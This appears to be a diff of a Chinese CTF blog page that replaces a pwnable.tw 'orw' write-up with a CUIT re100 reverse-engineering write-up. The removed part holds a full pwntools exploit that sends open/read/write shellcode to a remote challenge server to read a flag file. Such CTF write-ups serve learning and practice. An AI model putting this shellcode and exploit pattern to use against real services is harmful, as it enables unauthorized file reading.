@@ -4,24 +4,24 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>pwnable.tw之orw解析 | Reshahar的博客</title>
+    <title>胖哈勃杯第十三届CUIT校赛 re100 | Reshahar的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Reshahar">
     
 
     
-    <meta name="description" content="pwnable.tw 上的第二道题，考察的就是shellcode的编写（汇编代码）能力">
-<meta name="keywords" content="pwn,other,asm_program">
+    <meta name="description" content="100分的逆向题">
+<meta name="keywords" content="ctf,re">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.tw之orw解析">
-<meta property="og:url" content="http://Reshahar.github.io/2017/05/20/pwnable-tw-orw解析/index.html">
+<meta property="og:title" content="胖哈勃杯第十三届CUIT校赛 re100">
+<meta property="og:url" content="http://Reshahar.github.io/2017/05/30/胖哈勃杯第十三届CUIT校赛-re100/index.html">
 <meta property="og:site_name" content="Reshahar的博客">
-<meta property="og:description" content="pwnable.tw 上的第二道题，考察的就是shellcode的编写（汇编代码）能力">
-<meta property="og:updated_time" content="2017-05-20T14:08:38.000Z">
+<meta property="og:description" content="100分的逆向题">
+<meta property="og:updated_time" content="2017-06-01T08:19:42.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.tw之orw解析">
-<meta name="twitter:description" content="pwnable.tw 上的第二道题，考察的就是shellcode的编写（汇编代码）能力">
+<meta name="twitter:title" content="胖哈勃杯第十三届CUIT校赛 re100">
+<meta name="twitter:description" content="100分的逆向题">
 
     
     <link rel="alternative" href="/atom.xml" title="Reshahar的博客" type="application/atom+xml">
@@ -82,14 +82,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/05/20/pwnable-tw-orw解析/" title="pwnable.tw之orw解析" itemprop="url">pwnable.tw之orw解析</a>
+      <a href="/2017/05/30/胖哈勃杯第十三届CUIT校赛-re100/" title="胖哈勃杯第十三届CUIT校赛 re100" itemprop="url">胖哈勃杯第十三届CUIT校赛 re100</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/" title="Reshahar" target="_blank" itemprop="author">Reshahar</a>
 		
   <p class="article-time">
-    <time datetime="2017-05-20T03:00:37.000Z" itemprop="datePublished"> 发表于 2017-05-20</time>
+    <time datetime="2017-05-30T14:15:27.000Z" itemprop="datePublished"> 发表于 2017-05-30</time>
       
      &nbsp
      <span id="busuanzi_container_page_pv" style="display:none">
@@ -103,100 +103,168 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-总结"><span class="toc-number">3.</span> <span class="toc-text">0x02 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-参考"><span class="toc-number">4.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-总结"><span class="toc-number">2.</span> <span class="toc-text">0x01 总结</span></a></li></ol>
 		
 		</div>
 		
-		<p>pwnable.tw 上的第二道题，考察的就是shellcode的编写（汇编代码）能力</p>
+		<p>100分的逆向题</p>
 <hr>
 <a id="more"></a>
-<h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p>这个题没有什么弯路，就是看你自己shellcode和汇编的能力</p>
-<p>题目相关文件：<a href="https://github.com/Reshahar/BlogFile/tree/master/pwnable.tw-orw" target="_blank" rel="external">https://github.com/Reshahar/BlogFile/tree/master/pwnable.tw-orw</a></p>
-<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>首先还是使用IDA看一下程序，代码如下</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+<h3 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00 分析"></a>0x00 分析</h3><p>题目相关文件：<a href="https://github.com/Reshahar/BlogFile/tree/master/2017-cuit-re100" target="_blank" rel="external">https://github.com/Reshahar/BlogFile/tree/master/2017-cuit-re100</a></p>
+<p>首先运行程序，让输入一个flag，随便输入一个退出了，查壳什么也没有，先拖到IDA中吧</p>
+<pre><code>int start()
 {
-int v4; // [sp+4h] [bp-4h]@0
-int savedregs; // [sp+8h] [bp+0h]@0
-int savedregs_4; // [sp+Ch] [bp+4h]@0
+char v1; // [sp+0h] [bp-100h]@1
 
-orw_seccomp();
-printf(&quot;Give my your shellcode:&quot;);
-read(0, &amp;shellcode, 0xC8u);
-((void (__stdcall *)(int, int, int))shellcode)(v4, savedregs, savedregs_4);
+print(aFIUFlag);
+read(&amp;v1, 256);
+check(&amp;v1);
 return 0;
 }
-</code></pre><p>程序的功能就是让你放置shellcode然后执行，而pwnable.tw上说了只能使用orw(open，read，write)函数去读去 “/home/orw/flag” 的内容，直接写汇编可能有点难度，所以还是先用C语言实现一下，然后参考C语言的流程再用汇编实现，可能更好，当然如果你的汇编能力极强可以直接写</p>
-<p>我写的C语言程序如下：</p>
-<pre><code>//在/home/orw/下创建flag文件
-#include &lt;unistd.h&gt;  
-#include &lt;stdio.h&gt;
-#include &lt;fcntl.h&gt;  
-
-int main()
+</code></pre><p>主函数很简单，总共也没有几个函数（这里函数重命名过了），主要看一下check</p>
+<pre><code>int __cdecl check(const char *input_str)
 {
-    int fd;
-    char buf[100]={0};
-    fd = open(&quot;/home//orw//flag&quot;,0,0);
+int result; // eax@5
+signed int i; // [sp+8h] [bp-Ch]@2
 
-    read(fd,buf,100);
-
-    write(1,buf,100);
-
-    close(fd);
+if ( strlen(input_str) == 23 )
+{
+    calc((int)input_str);
+    for ( i = 0; i &lt; 23; ++i )
+    {
+    if ( input_str[i] != unk_403048[i] )
+        return print(aFlagT__0);
+    }
+    result = print(aFlagT);
 }
-</code></pre><p>编译运行，结果如下</p>
-<pre><code>root@kali:~/D/other/asm_program/pwnable.tw-orw# ./test
-FLAG{123123}
-</code></pre><p>然后就使用汇编实现了，c语言调用函数不适合汇编，汇编编写的时候要用int 0x80系统调用</p>
-<pre><code>sys_read    调用号3
-sys_write   调用号4
-sys_open    调用号5
-</code></pre><p>使用pwntools的asm功能，完整的exp如下：</p>
-<pre><code>#filename:exp.py
-#author: reshahar
+else
+{
+    result = print(aFlagT_);
+}
+return result;
+}
+</code></pre><p>主要就是将输入的字符串进行计算，然后和unk_403048地址的字符串比较，字符串的长度是23，看来主要就在calc函数里</p>
+<pre><code>int __cdecl calc(int input_str)
+{
+int result; // eax@3
+unsigned int v2; // edx@3
+signed int i; // [sp+18h] [bp-4h]@1
 
-from pwn import *
-#p = process(&apos;./orw&apos;)
-p = remote(&apos;chall.pwnable.tw&apos;,10001)
+for ( i = 0; i &lt; 23; ++i )
+{
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str);
+    v2 = ~(*(_BYTE *)(i + input_str) | 0xFFFFFFCE) | ~(~*(_BYTE *)(i + input_str) | 0x31);
+    *(_BYTE *)(i + input_str);
+    *(_BYTE *)(i + input_str) = ~(~(*(_BYTE *)(i + input_str) | 0xCE) | ~(~*(_BYTE *)(i + input_str) | 0x31));
+    result = i + 1;
+    }
+    return result;
+}
+</code></pre><p>这个函数看着很长实际都是迷惑你，这里IDA很容易就能看出来，要是用OD完了，就算你很清醒，也会变得迷迷糊糊，主要就是通过最后一条语句进行计算，其他的都没有改变你输入的值</p>
+<pre><code>*(_BYTE *)(i + input_str) = ~(~(*(_BYTE *)(i + input_str) | 0xCE) | ~(~*(_BYTE *)(i + input_str) | 0x31));
+</code></pre><p>这里我用python写的脚本，当然用c语言更好，脚本如下</p>
+<pre><code>list = [0x9D,0x97,0x8D,0xB5,0x84,0xBB,0xFB,0xBA,0x91,0x8C,0x90,0xBD,0xFD,0x91,0x80,0xFE,0xBC,0x91,0x8D,0xFE,0xAA,0xAB,0xB3]                     
 
-sh =  asm(&apos;sub esp,100&apos;)    
-sh += asm(&apos;xor ecx,ecx&apos;)
-sh += asm(&apos;xor edx,edx&apos;)
-sh += asm(&apos;xor eax,eax&apos;)
-sh += asm(&apos;xor ebx,ebx&apos;)
-sh += asm(&apos;push ecx&apos;)
-sh += asm(&apos;push 0x67616c66&apos;)        #string &apos;/home//orw//flag&apos;
-sh += asm(&apos;push 0x2f2f7772&apos;)
-sh += asm(&apos;push 0x6f2f2f65&apos;)
-sh += asm(&apos;push 0x6d6f682f&apos;)
-sh += asm(&apos;mov ebx,esp&apos;)
-sh += asm(&apos;mov al,5&apos;)
-sh += asm(&apos;int 0x80&apos;)               #call open()
-sh += asm(&apos;nop&apos;)
-sh += asm(&apos;mov ebx,eax&apos;)
-sh += asm(&apos;mov ecx,esp&apos;)
-sh += asm(&apos;mov edx,60&apos;)
-sh += asm(&apos;mov eax,3&apos;)
-sh += asm(&apos;int 0x80&apos;)               #call read()
-sh += asm(&apos;nop&apos;)
-sh += asm(&apos;mov ebx,1&apos;)
-sh += asm(&apos;mov edx,60&apos;)
-sh += asm(&apos;mov eax,4&apos;)
-sh += asm(&apos;int 0x80&apos;)               #call write()
-sh += asm(&apos;nop&apos;)
-sh += asm(&apos;add esp,120&apos;)            #stack balance 
-sh += asm(&apos;ret&apos;)
+flag = &apos;&apos;
 
-p.send(sh)
-
-# f = open (&apos;1&apos;,&apos;wb&apos;)
-# f.write(sh)
-
-p.recvuntil(&apos;Give my your shellcode:&apos;)
-
-print p.recv(60)
-</code></pre><h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>调试很重要，如果shellcode不正常，调试就是最好的解决办法，仅靠大脑去推算是不行 </p>
-<h3 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h3><p>[1]:<a href="http://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="external">http://blog.csdn.net/xiaominthere/article/details/17287965</a> Linux系统调用 int 80h int 0x80<br>[2]:<a href="http://lobert.iteye.com/blog/1705861" target="_blank" rel="external">http://lobert.iteye.com/blog/1705861</a> linux c学习笔记—-文件的创建与读写(open,read,write)</p>
+for i in list:
+    for j in range(20,128):
+        y=~((~((j%256)|0xCE))|~((~(j%256))|0x31))
+        if y == i:
+            flag +=chr(j)
+print flag
+</code></pre><h3 id="0x01-总结"><a href="#0x01-总结" class="headerlink" title="0x01 总结"></a>0x01 总结</h3><p>不一定要马上使用OD才好，IDA可能更快解决问题</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -204,13 +272,13 @@ print p.recv(60)
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/ctf-pwn/">ctf-pwn</a>
+  <a class="article-category-link" href="/categories/ctf-re/">ctf-re</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/other/">other</a><a href="/tags/asm-program/">asm_program</a>
+  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/re/">re</a>
   </div>
 
 </div>
@@ -219,7 +287,7 @@ print p.recv(60)
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://Reshahar.github.io/2017/05/20/pwnable-tw-orw解析/" data-title="pwnable.tw之orw解析 | Reshahar的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://Reshahar.github.io/2017/05/30/胖哈勃杯第十三届CUIT校赛-re100/" data-title="胖哈勃杯第十三届CUIT校赛 re100 | Reshahar的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -233,21 +301,13 @@ print p.recv(60)
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2017/05/18/pwnable-rw-start分析与折腾/" title="pwnable.rw之start分析与折腾">
+ <a href="/2017/05/27/pwnable-kr-passcode/" title="pwnable.kr之passcode">
   <strong>上一篇：</strong><br/>
   <span>
-  pwnable.rw之start分析与折腾</span>
+  pwnable.kr之passcode</span>
 </a>
 </div>
 
-
-<div class="next">
-<a href="/2017/05/23/pwnable-kr-fd/"  title="pwnable.kr之fd">
- <strong>下一篇：</strong><br/> 
- <span>pwnable.kr之fd
-</span>
-</a>
-</div>
 
 </nav>
 
@@ -259,7 +319,7 @@ print p.recv(60)
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-总结"><span class="toc-number">3.</span> <span class="toc-text">0x02 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-参考"><span class="toc-number">4.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-总结"><span class="toc-number">2.</span> <span class="toc-text">0x01 总结</span></a></li></ol>
  
   </div>
 
